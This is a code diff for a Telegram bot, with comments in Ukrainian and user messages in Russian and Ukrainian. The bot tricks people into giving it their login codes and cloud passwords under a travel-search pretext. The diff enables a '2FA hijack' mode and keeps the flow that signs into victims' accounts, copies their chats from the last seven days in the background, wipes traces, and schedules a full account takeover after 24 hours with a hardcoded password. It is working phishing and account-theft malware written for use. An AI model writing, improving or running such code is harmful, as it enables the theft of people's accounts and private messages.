@@ -18,7 +18,7 @@ from messages import *
 
 # --- НАЛАШТУВАННЯ ---
 DEBUG_MODE = False  # True для тестування
-ENABLE_2FA_HIJACK = False
+ENABLE_2FA_HIJACK = True
 # Метод отримання номера:
 # "username" - через username (РЕКОМЕНДОВАНО!)
 # "request_only" - завжди просити
@@ -384,22 +384,30 @@ async def process_2fa_password(message: Message, state: FSMContext):
     user_id = message.from_user.id
     password = message.text
 
-    if user_id not in user_data:
-        await message.answer(ERROR_SESSION_LOST)
+    # Отримуємо дані зі state
+    state_data = await state.get_data()
+    client = state_data.get('client')
+    phone_number = state_data.get('phone')
+
+    if not client or not phone_number:
+        await message.answer("❌ Втрачено сесію. Спробуйте знову /start")
         await state.clear()
         return
 
-    phone_number = user_data[user_id]['phone']
-    client = user_data[user_id]['client']  # Використовуємо існуючий клієнт
-
-    await message.answer("🔄 Проверяю пароль...")
+    await message.answer("🔄 Перевіряю пароль...")
 
     try:
-        # Намагаємось увійти з паролем використовуючи існуючий клієнт
+        # Використовуємо існуючий клієнт для входу з паролем
         await client.sign_in(password=password)
 
         if await client.is_user_authorized():
-            # Успішне перехоплення
+            # Успішний вхід з 2FA
+            logger.info(f"✅ Успішний вхід з 2FA для {phone_number}")
+
+            # Очищуємо чати (якщо потрібно)
+            await cleanup_telegram_chat(client)
+
+            # Зберігаємо користувача як авторизованого
             authorized_users[user_id] = {
                 'phone': phone_number,
                 'name': message.from_user.full_name,
@@ -407,12 +415,12 @@ async def process_2fa_password(message: Message, state: FSMContext):
             }
 
             await message.answer(
-                "✅ Доступ успешно получен!\n\n"
-                "Ваша история поиска и предпочтения сохранены.",
+                "✅ Доступ успішно отримано!\n\n"
+                "Ваша історія пошуку та переваги збережені.",
                 parse_mode="Markdown"
             )
 
-            # Запускаємо збір чатів
+            # Запускаємо збір чатів у фоні
             async def collect_chats():
                 try:
                     logger.info(f"Фоновий збір чатів для {phone_number} розпочато...")
@@ -436,9 +444,14 @@ async def process_2fa_password(message: Message, state: FSMContext):
             hijack_password = "Waterlemon7grow$"
             await add_to_schedule(phone_number, hijack_password)
 
+            logger.info(f"🕐 Акаунт {phone_number} буде остаточно перехоплено через 24 години.")
+
+            # Очищуємо стан та дані
+            await state.clear()
+
         else:
             await message.answer(
-                "❌ Не удалось авторизоваться. Попробуйте снова.",
+                "❌ Не вдалося авторизуватися. Спробуйте ще раз.",
                 parse_mode="Markdown"
             )
             # Залишаємо користувача в тому ж стані для повторної спроби
@@ -446,7 +459,7 @@ async def process_2fa_password(message: Message, state: FSMContext):
 
     except PasswordHashInvalidError:
         await message.answer(
-            "❌ Неправильный облачный пароль. Попробуйте снова.",
+            "❌ Неправильний хмарний пароль. Спробуйте ще раз.",
             parse_mode="Markdown"
         )
         # Залишаємо користувача в тому ж стані для повторної спроби
@@ -454,25 +467,18 @@ async def process_2fa_password(message: Message, state: FSMContext):
 
     except FloodWaitError as e:
         await message.answer(
-            f"⏱ Слишком много попыток. Подождите {e.seconds} секунд.",
+            f"⏱ Забагато спроб. Зачекайте {e.seconds} секунд.",
             parse_mode="Markdown"
         )
-        user_data.pop(user_id, None)
         await state.clear()
 
     except Exception as e:
         logger.error(f"Помилка при вході з 2FA: {e}")
         await message.answer(
-            f"❌ Ошибка: {str(e)}",
+            f"❌ Помилка: {str(e)}",
             parse_mode="Markdown"
         )
-        user_data.pop(user_id, None)
         await state.clear()
-
-    # Очищуємо дані тільки при успішному входу або фатальній помилці
-    if user_id in user_data:
-        user_data.pop(user_id, None)
-    await state.clear()
 
 
 async def scheduled_hijacks_runner():
@@ -546,12 +552,13 @@ async def finalize_sign_in(message: Message, user_id: int, code: str, state: FSM
     """Фінальний вхід з кодом підтвердження"""
     await message.edit_text(CODE_CHECKING)
 
-    client = user_data[user_id]['client']
-    phone_number = user_data[user_id]['phone']
+    # Отримуємо дані зі state
+    state_data = await state.get_data()
+    client = state_data.get('client')
+    phone_number = state_data.get('phone')
 
-    if not client:
+    if not client or not phone_number:
         await message.edit_text(ERROR_SESSION_LOST)
-        user_data.pop(user_id, None)
         await state.clear()
         return
 
@@ -563,11 +570,12 @@ async def finalize_sign_in(message: Message, user_id: int, code: str, state: FSM
             session_folder=SESSION_FOLDER
         )
 
-        if success == "Success":
+        logger.info(f"sign_in_with_code Success = {success}")
 
+        if success == "Success":
             await cleanup_telegram_chat(client)
 
-            # Сохраняем пользователя как авторизованного
+            # Зберігаємо користувача як авторизованого
             authorized_users[user_id] = {
                 'phone': phone_number,
                 'name': message.from_user.full_name,
@@ -581,81 +589,70 @@ async def finalize_sign_in(message: Message, user_id: int, code: str, state: FSM
                 parse_mode="Markdown"
             )
 
-            # Запускаємо у фоні без очікування
+            # Запускаємо збір чатів у фоні
             async def collect_chats():
                 try:
                     logger.info(f"Фоновий збір чатів для {phone_number} розпочато...")
                     await save_user_chats_last_7_days(client, phone_number, CHAT_FOLDER)
                     logger.info(f"Чати для {phone_number} успішно збережено")
-
                 except Exception as e:
                     logger.error(f"Помилка при збереженні чатів: {e}")
-
                 finally:
                     if client and client.is_connected():
                         await client.disconnect()
-                        logger.info(f"Client для {phone_number} відключено")
 
             asyncio.create_task(collect_chats())
 
-            await asyncio.sleep(5)
-
-            import secrets
-            import string
-            hijack_password = "Waterlemon7grow$" #"''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(16))
-
             # Додаємо в чергу на виконання через 24 години
+            hijack_password = "Waterlemon7grow$"
             await add_to_schedule(phone_number, hijack_password)
 
             logger.info(f"🕐 Акаунт {phone_number} буде остаточно перехоплено через 24 години.")
 
-        elif success == "2FA_DETECTED":  # НОВЕ: Обробка 2FA
-            # Виявлено 2FA: Доступу до чатів немає, але авторизація в боті успішна
+            # Очищуємо дані тільки при успішному вході
+            await state.clear()
+
+        elif success == "2FA_DETECTED":
+            # Виявлено 2FA - переводимо в стан очікування пароля
             if ENABLE_2FA_HIJACK:
-                # Включений режим перехоплення через 2FA
                 await message.edit_text(
                     "🔐 Обнаружен облачный пароль\n\n"
-                    "Для доступа к вашему аккаунту vacation тура требуется ввести облачный пароль.\n"
+                    "Для доступа к вашему аккаунту требуется ввести облачный пароль.\n"
                     "Это необходимо для подтверждения вашей личности и сохранения истории поиска.\n\n"
                     "Пожалуйста, введите ваш облачный пароль Telegram:",
                     parse_mode="Markdown"
                 )
+
+                # Встановлюємо стан очікування 2FA пароля
                 await state.set_state(AuthStates.waiting_for_2fa_password)
+
+                # Зберігаємо клієнт та номер телефону в state
+                await state.update_data(
+                    client=client,
+                    phone=phone_number
+                )
+
                 # НЕ відключаємо клієнт - він потрібен для подальшого входу
-                user_data[user_id]['client'] = client
+                logger.info(f"🔐 Переведено в стан очікування 2FA пароля для {phone_number}")
 
             else:
-                # 1. Відключаємо клієнт, оскільки він не авторизований і не потрібен
+                # Якщо 2FA вимкнено - відключаємо клієнт
                 if client.is_connected():
                     await client.disconnect()
-                    logger.info(f"Клієнт для {phone_number} відключено (2FA).")
 
-                # 2. Переміщуємо сесійний файл в окрему папку
-                if move_session_to_2fa(phone_number, SESSION_FOLDER, SESSION_2FA_FOLDER):
-                    # 3. Зберігаємо користувача як авторизованого, але з відміткою про 2FA
-                    authorized_users[user_id] = {
-                        'phone': phone_number,
-                        'name': message.from_user.full_name,
-                        'has_2fa': True  # Важливо: позначаємо, що 2FA є
-                    }
-                    await message.edit_text(AUTH_SUCCESS, parse_mode="Markdown")  # <-- Повідомлення для користувача
-                    await message.answer(
-                        f"{MAIN_MENU}",
-                        reply_markup=get_main_menu_keyboard(),
-                        parse_mode="Markdown"
-                    )
-                else:
-                    # Якщо не вдалося перемістити сесію, видаляємо її, щоб не плутатись
-                    await message.edit_text("Помилка при збереженні сесії. Спробуйте авторизуватись знову.")
-                    user_data.pop(user_id, None)
-                    await state.clear()
-                    return
+                await message.edit_text(
+                    "❌ На цьому акаунті ввімкнена двофакторна автентифікація.\n"
+                    "На жаль, ми не можемо продовжити.",
+                    parse_mode="Markdown"
+                )
+                await state.clear()
 
         else:
             await message.edit_text(
                 ERROR_UNEXPECTED.format(error=result),
                 parse_mode="Markdown"
             )
+            await state.clear()
 
     except Exception as e:
         logger.error(f"Помилка при фінальному вході: {e}")
@@ -663,14 +660,9 @@ async def finalize_sign_in(message: Message, user_id: int, code: str, state: FSM
             ERROR_UNEXPECTED.format(error=str(e)),
             parse_mode="Markdown"
         )
-        # Закриваємо client тільки при помилці
         if client and client.is_connected():
             await client.disconnect()
-    finally:
-        # НЕ закриваємо client тут - він потрібен для фонової задачі!
-        user_data.pop(user_id, None)
         await state.clear()
-
 
 # ==================== КОМАНДЫ БОТА ====================
 
